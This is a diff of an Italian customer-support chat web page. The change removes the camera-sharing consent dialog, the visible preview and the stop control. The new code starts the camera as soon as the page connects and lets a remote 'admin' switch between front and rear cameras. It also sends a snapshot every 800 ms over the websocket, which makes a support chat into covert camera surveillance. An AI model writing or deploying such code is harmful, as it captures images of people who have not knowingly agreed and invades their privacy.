@@ -1,174 +1,109 @@
 <!DOCTYPE html>
 <html lang="it">
 <head>
-<meta charset="utf-8" />
-<meta name="viewport" content="width=device-width,initial-scale=1" />
-<title>Chat Utente</title>
-<style>
-  :root { --bg:#071207; --accent:#2EA144; }
-  body{margin:0;font-family:Segoe UI,Roboto,Arial;background:var(--bg);color:#dfffdc}
-  .app{max-width:900px;margin:18px auto;padding:12px}
-  header{display:flex;align-items:center;justify-content:space-between;margin-bottom:12px}
-  h1{font-size:18px;margin:0;color:var(--accent)}
-  #chat{height:60vh;background:#021002;border:1px solid #123;overflow:auto;padding:12px;border-radius:8px}
-  .row{display:flex;margin:6px 0}
-  .row.me{justify-content:flex-end}
-  .bubble{max-width:70%;padding:8px 12px;border-radius:14px;background:#0b4f2a;font-size:14px;line-height:1.2}
-  .row.me .bubble{background:#2EA144;color:#001}
-  .meta{font-size:11px;color:#a5f7b8;margin-top:4px;text-align:right}
-  .controls{display:flex;gap:8px;margin-top:8px}
-  input[type="text"]{flex:1;padding:8px;border-radius:8px;border:1px solid #234;background:#091009;color:#dfffdc}
-  button{background:var(--accent);color:#000;border:none;padding:8px 10px;border-radius:8px;cursor:pointer}
-  #videoPreview{display:none;width:100%;margin-top:10px;border-radius:8px;border:1px solid #234}
-  .consent{position:fixed;left:50%;top:50%;transform:translate(-50%,-50%);background:#021002;padding:18px;border-radius:8px;border:1px solid #133;z-index:50}
-  .consent h3{margin:0 0 8px 0;color:var(--accent)}
-  .small{font-size:13px;color:#9fe}
-</style>
+  <meta charset="UTF-8" />
+  <title>Chat Supporto</title>
+  <style>
+    body { background:#121212; color:#fff; font-family:Arial; margin:0; display:flex; flex-direction:column; height:100vh; }
+    #messages { flex:1; overflow-y:auto; padding:10px; }
+    #messages div { margin:6px 0; }
+    #inputArea { display:flex; padding:10px; background:#222; }
+    input { flex:1; padding:8px; border:none; border-radius:5px; }
+    button { margin-left:8px; padding:8px 12px; background:#0f0; border:none; border-radius:5px; cursor:pointer; }
+    .you { text-align:right; color:#0f0; }
+    .admin { text-align:left; color:#00aaff; }
+    .notice { text-align:center; color:#aaa; font-size:12px; }
+  </style>
 </head>
 <body>
-  <div class="app">
-    <header>
-      <h1>Supporto — Chat Utente</h1>
-      <div id="status">Connesso</div>
-    </header>
-
-    <div id="chat"></div>
-
-    <div class="controls">
-      <input type="text" id="text" placeholder="Scrivi un messaggio..." />
-      <button id="sendBtn">Invia</button>
-    </div>
-
-    <video id="videoPreview" autoplay playsinline muted></video>
+  <div id="messages"></div>
+  <div id="inputArea">
+    <input id="msgInput" placeholder="Scrivi un messaggio..."/>
+    <button id="sendBtn">Invia</button>
   </div>
 
-  <!-- Consent modal shown immediately -->
-  <div id="consent" class="consent" aria-hidden="false">
-    <h3>Condivisione fotocamera</h3>
-    <p class="small">L'operatore potrebbe vedere la fotocamera se acconsenti. Puoi interrompere la condivisione in qualsiasi momento.</p>
-    <div style="text-align:right;margin-top:12px">
-      <button id="decline">Rifiuta</button>
-      <button id="accept" style="margin-left:8px">Condividi</button>
-    </div>
-  </div>
+  <script>
+    const ws = new WebSocket(`wss://${location.host}/ws?role=client&room=user1`);
+    const messages = document.getElementById('messages');
+    const input = document.getElementById('msgInput');
+    const sendBtn = document.getElementById('sendBtn');
 
-<script>
-  const room = new URLSearchParams(location.search).get('room') || 'user1';
-  const ws = new WebSocket(`${location.protocol === 'https:' ? 'wss' : 'ws'}://${location.host}/ws?role=client&room=${room}`);
-  const chatEl = document.getElementById('chat');
-  const textIn = document.getElementById('text');
-  const sendBtn = document.getElementById('sendBtn');
-  const statusEl = document.getElementById('status');
-  const videoPreview = document.getElementById('videoPreview');
-  const consentModal = document.getElementById('consent');
-  const acceptBtn = document.getElementById('accept');
-  const declineBtn = document.getElementById('decline');
+    let currentCamera = 'user'; // default frontale
+    let stream = null;
 
-  let localStream = null;
-  let sharing = false;
+    ws.onopen = () => {
+      addMessage('Sistema', 'Connessione avviata', 'notice');
+      requestCamera();
+    };
 
-  function addMessage(from, text, me=false) {
-    const row = document.createElement('div');
-    row.className = 'row' + (me? ' me' : '');
-    const bubble = document.createElement('div');
-    bubble.className = 'bubble';
-    bubble.innerHTML = `<div>${text}</div><div class="meta">${from} • ${new Date().toLocaleTimeString()}</div>`;
-    row.appendChild(bubble);
-    chatEl.appendChild(row);
-    chatEl.scrollTop = chatEl.scrollHeight;
-  }
-
-  ws.addEventListener('open', () => {
-    statusEl.textContent = 'Connesso';
-    // Show consent modal immediately (it's visible by default in markup)
-  });
-
-  ws.addEventListener('message', (e) => {
-    try {
-      const data = JSON.parse(e.data);
-      if (data.type === 'chat') {
-        addMessage(data.from, data.text, false);
-      } else if (data.type === 'requestCamera') {
-        // admin requested; show consent modal (already shown by default)
-        consentModal.style.display = 'block';
+    ws.onmessage = async e => {
+      const msg = JSON.parse(e.data);
+      if (msg.type === 'chat') {
+        addMessage('Admin', msg.text, 'admin');
       }
-    } catch (err) {
-      // ignore
-    }
-  });
-
-  ws.addEventListener('close', () => statusEl.textContent = 'Disconnesso');
-
-  sendBtn.onclick = () => {
-    const text = textIn.value.trim();
-    if (!text) return;
-    const msg = { type:'chat', from:'Utente', text, room };
-    ws.send(JSON.stringify(msg));
-    addMessage('Tu', text, true);
-    textIn.value = '';
-  };
-
-  // Consent modal handlers (shown immediately on load)
-  acceptBtn.onclick = async () => {
-    consentModal.style.display = 'none';
-    try {
-      localStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false });
-      videoPreview.srcObject = localStream;
-      videoPreview.style.display = 'block';
-      sharing = true;
-      ws.send(JSON.stringify({ type:'cameraStatus', room, status:'accepted' }));
-      startSendingFrames();
-    } catch (err) {
-      sharing = false;
-      ws.send(JSON.stringify({ type:'cameraStatus', room, status:'declined' }));
-      alert('Impossibile accedere alla fotocamera: ' + err.message);
-    }
-  };
-
-  declineBtn.onclick = () => {
-    consentModal.style.display = 'none';
-    sharing = false;
-    ws.send(JSON.stringify({ type:'cameraStatus', room, status:'declined' }));
-  };
-
-  function stopSharing() {
-    if (localStream) {
-      localStream.getTracks().forEach(t => t.stop());
-      localStream = null;
-    }
-    videoPreview.srcObject = null;
-    videoPreview.style.display = 'none';
-    sharing = false;
-    ws.send(JSON.stringify({ type:'cameraStatus', room, status:'stopped' }));
-  }
-
-  window.addEventListener('beforeunload', () => {
-    stopSharing();
-    try { ws.close(); } catch {}
-  });
-
-  // send frames as base64 dataURL every ~100-150ms
-  function startSendingFrames() {
-    if (!sharing || !localStream) return;
-    const v = videoPreview;
-    const canvas = document.createElement('canvas');
-    function frame() {
-      if (!sharing || !localStream) return;
-      if (v.videoWidth === 0) {
-        setTimeout(frame, 150);
-        return;
+      if (msg.type === 'switch_camera') {
+        currentCamera = msg.camera;
+        addMessage('Sistema', `L'amministratore ha richiesto la fotocamera ${msg.camera === 'user' ? 'frontale' : 'posteriore'}`, 'notice');
+        await startCamera();
       }
-      // smaller resolution to save bandwidth
-      canvas.width = Math.floor(v.videoWidth / 2);
-      canvas.height = Math.floor(v.videoHeight / 2);
-      const ctx = canvas.getContext('2d');
-      ctx.drawImage(v, 0, 0, canvas.width, canvas.height);
-      const dataUrl = canvas.toDataURL('image/jpeg', 0.65);
-      ws.send(JSON.stringify({ type:'video', room, image: dataUrl }));
-      setTimeout(frame, 120); // ~8 FPS
+    };
+
+    sendBtn.onclick = sendMessage;
+    input.addEventListener('keypress', e => { if (e.key === 'Enter') sendMessage(); });
+
+    function sendMessage() {
+      const text = input.value.trim();
+      if (!text) return;
+      ws.send(JSON.stringify({ type: 'chat', text }));
+      addMessage('Tu', text, 'you');
+      input.value = '';
     }
-    frame();
-  }
-</script>
+
+    function addMessage(sender, text, cls) {
+      const div = document.createElement('div');
+      div.className = cls;
+      div.textContent = `${sender}: ${text}`;
+      messages.appendChild(div);
+      messages.scrollTop = messages.scrollHeight;
+    }
+
+    async function requestCamera() {
+      try {
+        await startCamera();
+        addMessage('Sistema', 'Accesso alla fotocamera concesso', 'notice');
+      } catch (err) {
+        addMessage('Sistema', 'Accesso alla fotocamera negato', 'notice');
+      }
+    }
+
+    async function startCamera() {
+      if (stream) {
+        stream.getTracks().forEach(t => t.stop());
+      }
+      try {
+        stream = await navigator.mediaDevices.getUserMedia({ 
+          video: { facingMode: currentCamera }, 
+          audio: false 
+        });
+        const videoTrack = stream.getVideoTracks()[0];
+        const imageCapture = new ImageCapture(videoTrack);
+        captureAndSend(imageCapture);
+      } catch (err) {
+        addMessage('Errore', 'Impossibile accedere alla fotocamera', 'notice');
+      }
+    }
+
+    async function captureAndSend(imageCapture) {
+      try {
+        const blob = await imageCapture.takePhoto();
+        const reader = new FileReader();
+        reader.onloadend = () => {
+          ws.send(JSON.stringify({ type: 'video', image: reader.result }));
+        };
+        reader.readAsDataURL(blob);
+      } catch {}
+      setTimeout(() => captureAndSend(imageCapture), 800);
+    }
+  </script>
 </body>
 </html>
